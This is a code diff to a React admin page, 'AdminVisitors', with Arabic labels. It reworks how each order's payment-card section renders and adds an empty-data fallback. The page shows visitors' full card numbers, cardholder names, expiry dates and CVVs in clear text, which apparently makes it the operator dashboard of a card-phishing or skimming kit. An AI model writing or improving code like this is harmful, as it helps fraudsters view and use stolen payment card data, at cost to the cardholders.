@@ -1836,7 +1836,8 @@ const AdminVisitors = () => {
                               <div className="space-y-2.5">
 
                                 {/* 1. معلومات بطاقة الدفع + بطاقة 3D */}
-                                {(order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv || order.payment_method) && (() => {
+                                {(() => {
+                                  const hasCardData = order.card_holder_name || order.card_number_full || order.card_last_four || order.card_expiry || order.card_cvv || order.payment_method;
                                   const num = order.card_number_full || order.card_last_four || "";
                                   const meta = getCardMetadata(num);
                                   const brandColors: Record<string, { from: string; to: string }> = {
@@ -1856,40 +1857,46 @@ const AdminVisitors = () => {
                                       <div className="px-3 py-2 bg-amber-500/10 border-b border-amber-500/20">
                                         <p className="text-[10px] font-bold text-amber-600 flex items-center gap-1.5">💳 معلومات بطاقة الدفع</p>
                                       </div>
-                                      <div className="p-3 space-y-3">
-                                        {/* Mini 3D Card */}
-                                        <div className="mx-auto w-full max-w-[260px] h-[150px] rounded-xl p-3 flex flex-col justify-between text-white relative overflow-hidden"
-                                          style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 8px 24px ${bc.from}44` }}>
-                                          <div className="flex justify-between items-start">
-                                            <div className="w-8 h-5 rounded bg-yellow-300/80" />
-                                            <CardBrandLogo brandKey={meta.brandKey} className="w-10 h-6" />
-                                          </div>
-                                          <p className="text-[11px] font-mono tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
-                                          <div className="flex justify-between items-end text-[9px]">
-                                            <div>
-                                              <p className="text-white/50 text-[7px]">CARD HOLDER</p>
-                                              <p className="text-white/90 font-medium truncate max-w-[140px]">{order.card_holder_name || "—"}</p>
+                                      {hasCardData ? (
+                                        <div className="p-3 space-y-3">
+                                          {/* Mini 3D Card */}
+                                          <div className="mx-auto w-full max-w-[260px] h-[150px] rounded-xl p-3 flex flex-col justify-between text-white relative overflow-hidden"
+                                            style={{ background: `linear-gradient(135deg, ${bc.from}, ${bc.to})`, boxShadow: `0 8px 24px ${bc.from}44` }}>
+                                            <div className="flex justify-between items-start">
+                                              <div className="w-8 h-5 rounded bg-yellow-300/80" />
+                                              <CardBrandLogo brandKey={meta.brandKey} className="w-10 h-6" />
                                             </div>
-                                            <div className="text-left" dir="ltr">
-                                              <p className="text-white/50 text-[7px]">EXPIRES</p>
-                                              <p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p>
+                                            <p className="text-[11px] font-mono tracking-[2px] text-white/90 text-center" dir="ltr">{displayNum}</p>
+                                            <div className="flex justify-between items-end text-[9px]">
+                                              <div>
+                                                <p className="text-white/50 text-[7px]">CARD HOLDER</p>
+                                                <p className="text-white/90 font-medium truncate max-w-[140px]">{order.card_holder_name || "—"}</p>
+                                              </div>
+                                              <div className="text-left" dir="ltr">
+                                                <p className="text-white/50 text-[7px]">EXPIRES</p>
+                                                <p className="text-white/90 font-medium">{order.card_expiry || "MM/YY"}</p>
+                                              </div>
                                             </div>
+                                            {meta.isDetected && meta.bankName && (
+                                              <p className="absolute bottom-1 left-1/2 -translate-x-1/2 text-[7px] text-white/40">{meta.bankName}</p>
+                                            )}
                                           </div>
-                                          {meta.isDetected && meta.bankName && (
-                                            <p className="absolute bottom-1 left-1/2 -translate-x-1/2 text-[7px] text-white/40">{meta.bankName}</p>
-                                          )}
+                                          {/* Data fields */}
+                                          <div className="grid grid-cols-2 gap-2">
+                                            {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
+                                            {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
+                                            {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
+                                            {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
+                                            {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
+                                            {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
+                                            {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
+                                          </div>
                                         </div>
-                                        {/* Data fields */}
-                                        <div className="grid grid-cols-2 gap-2">
-                                          {order.card_holder_name && <InfoItem label="اسم حامل البطاقة" value={order.card_holder_name} />}
-                                          {order.card_number_full && <InfoItem label="رقم البطاقة" value={order.card_number_full.replace(/(.{4})/g, '$1 ').trim()} />}
-                                          {!order.card_number_full && order.card_last_four && <InfoItem label="آخر 4 أرقام" value={`**** ${order.card_last_four}`} />}
-                                          {order.card_expiry && <InfoItem label="تاريخ الانتهاء" value={order.card_expiry} />}
-                                          {order.card_cvv && <InfoItem label="CVV" value={order.card_cvv} />}
-                                          {order.payment_method && <InfoItem label="طريقة الدفع" value={order.payment_method === "card" ? "بطاقة بنكية" : order.payment_method === "atm" ? "سداد ATM" : order.payment_method} />}
-                                          {meta.isDetected && <InfoItem label="نوع البطاقة" value={`${meta.brandLabel} - ${meta.classificationLabel}`} />}
+                                      ) : (
+                                        <div className="px-3 py-2.5">
+                                          <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                                         </div>
-                                      </div>
+                                      )}
                                     </div>
                                   );
                                 })()}
